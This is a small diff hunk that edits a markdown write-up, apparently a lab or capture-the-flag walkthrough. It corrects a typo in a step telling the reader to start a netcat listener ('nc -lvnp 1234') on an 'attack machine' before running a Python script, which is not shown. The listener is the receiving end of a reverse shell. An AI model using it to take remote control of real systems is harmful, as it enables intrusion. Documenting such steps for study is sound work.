@@ -213,7 +213,7 @@ I referred to: <https://jaytaylor.com/notes/node/1520886669000.html>\
 \
 1. A listener on our atttack machine
 \
-→ -nc -lvnp 1234 will accomplish this. 
+→ nc -lvnp 1234 will accomplish this. 
 \
 2. Run this python script:
 \
